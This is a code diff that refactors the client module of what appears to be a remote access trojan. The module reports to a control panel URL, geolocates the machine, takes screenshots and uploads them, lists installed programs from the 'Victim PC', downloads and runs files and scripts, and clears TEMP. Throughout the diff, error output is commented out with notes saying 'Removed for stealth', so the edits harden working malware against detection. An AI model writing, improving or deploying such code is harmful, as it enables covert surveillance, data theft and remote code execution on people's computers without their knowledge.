@@ -6,7 +6,7 @@ class ClientsCMD:
     def __init__(self, panelURL, machineID):
         self.panelURL = panelURL
         self.machineID = machineID
-        self.C = HTTPSocket(str(self.panelURL), str(self.machineID))   # Initiate HTTPSocket Class
+        self.C = HTTPSocket(self.panelURL, self.machineID)   # Initiate HTTPSocket Class
         self.tempdir = tempfile.gettempdir()
 
     def get_device_location(self):
@@ -14,12 +14,12 @@ class ClientsCMD:
         Function to return GeoIP Latitude & Longitude
         """
         try:
-            ip = requests.get("https://api.ipify.org")
-            ip = str(ip.content).split('\'')[1]    
-            geo_request = requests.get("https://get.geojs.io/v1/ip/geo/" + ip + ".json")
+            ip_response = requests.get("https://api.ipify.org", timeout=15)
+            ip = ip_response.text.strip()
+            geo_request = requests.get("https://get.geojs.io/v1/ip/geo/" + ip + ".json", timeout=15)
             geo_data = geo_request.json()
             
-            path = f"{self.tempdir}\\Location.txt"
+            path = os.path.join(self.tempdir, "Location.txt")
             
             with open(path, "w") as f:
                 f.write(f"Accuracy          : {geo_data['accuracy']}         \n")                    
@@ -47,9 +47,9 @@ class ClientsCMD:
             self.C.Send("CleanCommands") 
         except Exception as e:
             self.C.Send("CleanCommands")
+            # print("[Error In ClientsCMD, get_device_location() Function]") # Removed for stealth
+            # print(f"[Error] : {e}\n") # Removed for stealth
             self.C.Log("Fail", "An unexpected error occurred " + str(e))              
-            print("[Error In ClientsCMD, get_device_location() Function]")
-            print(f"[Error] : {e}\n")
 
     def upload_and_execute_file(self, file_url, file_new_name):
         try:
@@ -57,17 +57,18 @@ class ClientsCMD:
             if file_new_name == "":
                 file_new_name = file_url.split("/")[-1]
                 
-            self.C.Download(file_url, self.tempdir + "\\" + file_new_name)
+            destination_path = os.path.join(self.tempdir, file_new_name)
+            self.C.Download(file_url, destination_path)
 
             #Executing File 
-            os.system(str(self.tempdir) + "\\" + file_new_name)
+            os.system(destination_path)
 
             self.C.Log("Succ", "File is Uploaded and Executed File Successfully")  
             self.C.Send("CleanCommands") 
         except Exception as e:
             self.C.Send("CleanCommands")
-            print("[Error In ClientsCMD, upload_and_execute_file() Function]")
-            print(f"[Error] : {e}\n")
+            # print("[Error In ClientsCMD, upload_and_execute_file() Function]") # Removed for stealth
+            # print(f"[Error] : {e}\n") # Removed for stealth
             self.C.Log("Fail", "An unexpected error occurred : " + str(e))        
 
     def show_message_box(self, msg, title, iconType, buttonType):
@@ -90,44 +91,47 @@ class ClientsCMD:
         0  = Blank         
         """  
         try:
-            os.chdir(self.tempdir)
             
+            buttonNumber = 0 # Default to OkOnly
             if buttonType == "OkOnly":
                 buttonNumber = 0
-            if buttonType == "OkCancel":
+            elif buttonType == "OkCancel":
                 buttonNumber = 1
-            if buttonType == "AbortRetryIgnore":
+            elif buttonType == "AbortRetryIgnore":
                 buttonNumber = 2
-            if buttonType == "YesNoCancel":
+            elif buttonType == "YesNoCancel":
                 buttonNumber = 3            
-            if buttonType == "YesNO":
+            elif buttonType == "YesNO":
                 buttonNumber = 4
-            if buttonType == "RetryCancel":
+            elif buttonType == "RetryCancel":
                 buttonNumber = 5
 
+            iconNumber = 0 # Default to Blank
             if iconType == "None":
                 iconNumber = 0
-            if iconType == "Critical":
+            elif iconType == "Critical":
                 iconNumber = 16
-            if iconType == "Question":
+            elif iconType == "Question":
                 iconNumber = 32
-            if iconType == "Warning":
+            elif iconType == "Warning":
                 iconNumber = 48
-            if iconType == "Information":
+            elif iconType == "Information":
                 iconNumber = 64
 
-            with open("message.vbs", "w") as f:
+            vbs_path = os.path.join(self.tempdir, "message.vbs")
+            with open(vbs_path, "w") as f:
                 f.write("dim message\n")
                 f.write(f"message = MsgBox(\"{msg}\", {iconNumber + buttonNumber}, \"{title}\")\n")
                 
-            os.system(self.tempdir + "\\message.vbs") #Executing VBScript    
+            os.system(vbs_path) #Executing VBScript    
+            os.remove(vbs_path) # Clean up the VBS file
 
             self.C.Log("Succ", "Message Shown Successfully")  
             self.C.Send("CleanCommands") 
         except Exception as e:
             self.C.Send("CleanCommands")
-            print("[Error In ClientsCMD, show_message_box() Function]")
-            print(f"[Error] : {e}\n")
+            # print("[Error In ClientsCMD, show_message_box() Function]") # Removed for stealth
+            # print(f"[Error] : {e}\n") # Removed for stealth
             self.C.Log("Fail", "An unexpected error occurred : " + str(e))
 
     def take_screenshot(self):
@@ -135,19 +139,18 @@ class ClientsCMD:
         When Called, It Saves the screenshot.png in TEMP
         """
         try:       
-            os.chdir(self.tempdir)
-            filename = str(base64.b64encode(self.machineID.encode()))
-            filename = filename.split('\'')[1]
+            filename = base64.b64encode(self.machineID.encode()).decode('utf-8')
+            screenshot_path = os.path.join(self.tempdir, f"{filename}.png")
 
             with mss() as screenshot:
-                screenshot.shot(output=f"{filename}.png")
-            self.C.Upload(str(self.tempdir) + f"\\{filename}.png")            
-            os.remove(f'{filename}.png')
+                screenshot.shot(output=screenshot_path)
+            self.C.Upload(screenshot_path)
+            os.remove(screenshot_path)
             self.C.Send("CleanCommands")
             self.C.Log("Succ", "Screenshot Recived Successfully")            
         except Exception as e:
-            print("[Error In ClientsCMD, take_screenshot() Function]")
-            print(f"[Error] : {e}\n")
+            # print("[Error In ClientsCMD, take_screenshot() Function]") # Removed for stealth
+            # print(f"[Error] : {e}\n") # Removed for stealth
             self.C.Log("Fail", "An unexpected error occurred : " + str(e))
 
     def get_program_list(self):
@@ -155,16 +158,17 @@ class ClientsCMD:
         When Called, It Saves the ProgramList.txt in TEMP
         """
         try:
-            cmd = f"wmic /output:{self.tempdir}\\ProgramList.txt product get name,version"
+            list_path = os.path.join(self.tempdir, "ProgramList.txt")
+            cmd = f"wmic /output:{list_path} product get name,version"
             os.system(cmd)
-            self.C.Upload(f"{self.tempdir}\\ProgramList.txt")
-            os.remove(f"{self.tempdir}\\ProgramList.txt")
+            self.C.Upload(list_path)
+            os.remove(list_path)
             
             self.C.Log("Succ", "Retrived Installed Program List from Victim PC")
             self.C.Send("CleanCommands")
         except Exception as e:
-            print("[Error In ClientsCMD, get_program_list() Function]")
-            print(f"[Error] : {e}\n")
+            # print("[Error In ClientsCMD, get_program_list() Function]") # Removed for stealth
+            # print(f"[Error] : {e}\n") # Removed for stealth
             self.C.Log("Fail", "An unexpected error occurred : " + str(e))                    
         
     def execute_script(self, script_type, script_name):
@@ -173,24 +177,27 @@ class ClientsCMD:
         Creates the Script in TEMP Directory, Executes the Script, Atlast Deletes the Scripts  
         """
         try:
-            os.chdir(self.tempdir)  # Changing Current Directory to TEMP
-            if script_name[len(script_name)-3:] != "bat" and script_name[len(script_name)-3:] != "vbs" and script_name[len(script_name)-3:] != "ps1":
-                script_name = script_name + "." + script_type
+            
+            # Remove existing extension before adding the correct one
+            base_name, _ = os.path.splitext(script_name)
+            script_name = f"{base_name}.{script_type.lower()}"
+            
+            script_path = os.path.join(self.tempdir, script_name)
             
             # Downloading script in TEMP Directory
             #======================================================
-            self.C.Download(self.panelURL + "scripts/" + script_name, self.tempdir + "\\" + script_name)
+            self.C.Download(self.panelURL + "scripts/" + script_name, script_path)
             #=======================================================
             
-            os.system(self.tempdir + "\\" + script_name) # Executing Script
-            os.remove(self.tempdir + "\\" + script_name) # Removing Script from TEMP
+            os.system(script_path) # Executing Script
+            os.remove(script_path) # Removing Script from TEMP
             
             self.C.Send("DeleteScript|BN|" + script_name)
             self.C.Log("Succ", "Executed Script Successfully")
             self.C.Send("CleanCommands")        
         except Exception as e:
-            print("[Error In ClientsCMD, execute_script() Function]")
-            print(f"[Error] : {e}\n")
+            # print("[Error In ClientsCMD, execute_script() Function]") # Removed for stealth
+            # print(f"[Error] : {e}\n") # Removed for stealth
             self.C.Log("Fail", "An unexpected error occurred : " + str(e))
              
     def clear_temp_directory(self):
@@ -198,18 +205,21 @@ class ClientsCMD:
         When Called, It Cleans the TEMP Directory
         """    
         try:
-            os.chdir(self.tempdir)
-            for file in os.listdir():
-                if file != "FXSAPIDebugLogFile.txt" and file[:4] != "_MEI":
+            for file_name in os.listdir(self.tempdir): # Iterate over full path now
+                full_path = os.path.join(self.tempdir, file_name)
+                if file_name != "FXSAPIDebugLogFile.txt" and file_name[:4] != "_MEI":
                     try:
-                        shutil.rmtree(file)
-                    except:
-                        os.remove(file)
+                        if os.path.isdir(full_path):
+                            shutil.rmtree(full_path)
+                        else:
+                            os.remove(full_path)
+                    except Exception: # Catch any error during deletion
+                        pass # Attempt best effort cleanup
             self.C.Log("Succ", "TEMP Directory Cleaned Successfully")
             self.C.Send("CleanCommands")         
         except Exception as e:
-            print("[Error In ClientsCMD, clear_temp_directory() Function]")
-            print(f"[Error] : {e}\n")
+            # print("[Error In ClientsCMD, clear_temp_directory() Function]") # Removed for stealth
+            # print(f"[Error] : {e}\n") # Removed for stealth
             self.C.Log("Fail", "An unexpected error occurred : " + str(e))            
                     
     def close_connection(self):
@@ -221,10 +231,6 @@ class ClientsCMD:
             self.C.Log("Succ", "Connection closed")
             self.C.Send("CleanCommands")            
         except Exception as e:
-            print("[Error In ClientsCMD, close_connection()]")
-            print(f"[Error] : {e}\n")        
+            # print("[Error In ClientsCMD, close_connection()]") # Removed for stealth
+            # print(f"[Error] : {e}\n") # Removed for stealth        
             self.C.Log("Fail", "An unexpected error occurred : " + str(e))
-
-    def moveclient(self, newPanelURL):
-        print(newPanelURL)
-        self.C.Send("CleanCommands")   
